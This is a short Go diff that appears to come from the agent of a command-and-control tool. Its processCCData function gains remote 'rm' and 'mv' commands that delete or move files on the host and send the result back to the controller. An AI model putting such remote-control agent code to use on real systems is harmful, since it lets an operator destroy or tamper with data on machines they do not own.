@@ -92,13 +92,27 @@ func processCCData(data *MsgTunData) {
 
 		// remove file/dir
 		if cmdSlice[0] == "rm" {
-			out = "rm failed"
 			if len(cmdSlice) != 2 {
 				return
 			}
 
-			if os.RemoveAll(cmdSlice[1]) == nil {
-				out = "Deleted " + cmdSlice[1]
+			out = "Deleted " + cmdSlice[1]
+			if err = os.RemoveAll(cmdSlice[1]); err != nil {
+				out = fmt.Sprintf("Failed to delete %s: %v", cmdSlice[1], err)
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// remove file/dir
+		if cmdSlice[0] == "mv" {
+			if len(cmdSlice) != 3 {
+				return
+			}
+
+			out = fmt.Sprintf("%s has been moved to %s", cmdSlice[1], cmdSlice[2])
+			if err = os.Rename(cmdSlice[1], cmdSlice[2]); err != nil {
+				out = fmt.Sprintf("Failed to move %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
